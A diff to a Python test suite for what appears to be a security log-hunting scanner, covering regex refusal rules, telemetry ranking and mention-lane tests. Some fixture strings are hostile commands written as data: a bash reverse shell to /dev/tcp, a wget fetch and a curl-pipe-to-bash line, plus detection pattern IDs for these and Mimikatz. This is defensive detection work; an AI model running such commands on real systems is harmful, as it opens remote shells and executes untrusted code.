@@ -95,7 +95,8 @@ REFUSALS = [
     ({"match": {"anchored": "abcd(?=x)"}}, "refused"),
     ({"match": {"anchored": "abcd(?:e+)+"}}, "nested"),
     ({"match": {"anchored": "abcd(?:ef|gh)*"}}, "alternation inside a repeat"),
-    ({"match": {"anchored": "abcd.*e.*f.*g.*h"}}, "more than 3 repeats"),
+    ({"match": {"anchored": "abcd.*e.*f.*g.*h.*i"}}, "more than 4 repeats"),
+    ({"match": {"anchored": "abcd.*.*.*x"}}, "backtrack too far"),
     ({"telemetry": ["any", "linux_text"]}, "stands alone"),
     ({"id": "mention.two.parts"}, "id"),
     ({"match": {"anchored": "[a-z]+foo"}}, "literal prefix"),
@@ -527,11 +528,35 @@ def test_a_windows_record_no_normalizer_read_is_scanned_as_windows_text(tmp_path
     normalize_hits([record], unread=unread)
     assert [(hit["_id"], windows) for hit, _reason, windows in unread] == [("w1", True)]
     scanner = _scanner(tmp_path)
-    scanner.scan(TARGET, CONTRACT, unread, None)
-    kept = [scanner.patterns.patterns[row[1]].id for row in scanner.ranked()]
-    # the /dev/tcp pattern reads Linux text only; the wget pattern reads both
-    assert kept == ["mention.test_cron_wget"] and scanner.summary()["by_telemetry"] == {"windows_text": 1}
+    linux = _hit(2, "bash -i >& /dev/tcp/10.0.0.1/80 0>&1", host="ws1")
+    scanner.scan(TARGET, CONTRACT, [*unread, (linux, "x", False)], None)
+    rows = list(scanner.ranked())
+    patterns = scanner.patterns.patterns
+    # telemetry is a ranking hint, never a filter: the Linux-only /dev/tcp pattern still runs on Windows text, and
+    # leads that line (strongest); the line on the class it names ranks first among equals
+    assert [(patterns[row[1]].id, row[15]) for row in rows] == [
+        ("mention.test_dev_tcp_redirect", 1), ("mention.test_dev_tcp_redirect", 0)]
+    assert [patterns[i].id for i in json.loads(rows[1][14])] == ["mention.test_cron_wget"]
+    assert scanner.summary()["by_telemetry"] == {"windows_text": 1, "linux_text": 1}
     scanner.close()
+
+
+def test_a_weak_mention_is_in_the_mention_lane_never_context(tmp_path):
+    repo = _repo()
+    scanner = _scanner(tmp_path)
+    scanner.scan(TARGET, CONTRACT, [(_hit(1, "wget http://198.51.100.2/a"), "x")], None)
+    scanner.publish(repo)
+    scanner.close()
+    item = build_manifest(repo, "h1", "test")["mentions"]["items"][0]
+    assert item["pattern"]["strength"] == "weak" and item["lane"] == MENTION_LANE == "mention"
+    assert item["headline"].endswith("(mention)") and repo.candidates("h1") == []
+
+
+def test_the_pattern_set_matches_a_line_as_the_sweep_does():
+    patterns = load_mention_patterns(FIXTURES)
+    assert patterns.match("MIMIKATZ; curl http://x/y | bash") == ["mention.test_curl_pipe_shell",
+                                                                 "mention.test_mimikatz"]
+    assert patterns.match("nothing here") == [] and load_mention_patterns(FIXTURES / "none").match("x") == []
 
 
 # ---- the sweep, the store and every renderer ------------------------------------------------------------------------
@@ -845,7 +870,7 @@ def _sweep_kept(repo: Repo, hit: dict, *, rank: int = 1) -> dict:
     mention = {
         "id": f"mn-{rank:024d}", "hunt_id": "h1", "rank": rank, "pattern_id": "mention.test_x",
         "pattern_title": "X", "strength": "strong", "pattern_attack": ["T1059.004"], "also_matched": [],
-        "pattern_source": {"name": "t", "url": "u", "license": "l", "upstream_id": None}, "telemetry": "linux_text",
+        "pattern_source": {"name": "t", "url": "u", "license": "l", "upstream_id": None}, "telemetry": "linux_text", "telemetry_fit": True,
         "host": "web01", "target": hit["_index"], "native_id": hit["_id"],
         "raw_id": raw_record_id("h1", hit["_index"], hit["_id"]), "first_ts": T0, "last_ts": T0, "count": 1,
         "pattern_hosts": 1, "pattern_lines": 1, "line": hit["_source"].get("message", ""), "line_chars": 10,
@@ -905,7 +930,7 @@ def test_the_orient_page_carries_the_mention_slice_ahead_of_findings_and_keeps_i
         mention = {
             "id": f"mn-{rank:024d}", "hunt_id": "h1", "rank": rank, "pattern_id": f"mention.test_p{rank}",
             "pattern_title": "P", "strength": "medium", "pattern_attack": [], "pattern_source": {}, "also_matched": [],
-            "telemetry": "linux_text", "host": "web01", "target": "host-index", "native_id": f"n{rank}",
+            "telemetry": "linux_text", "telemetry_fit": True, "host": "web01", "target": "host-index", "native_id": f"n{rank}",
             "raw_id": f"rr-{rank:024d}", "first_ts": T0, "last_ts": T0, "count": rank, "pattern_hosts": 1,
             "pattern_lines": rank, "line": f"line {rank} " + "y" * 300, "line_chars": 310, "line_cut": False,
             "suspicious_content": False, "created_at": T0,
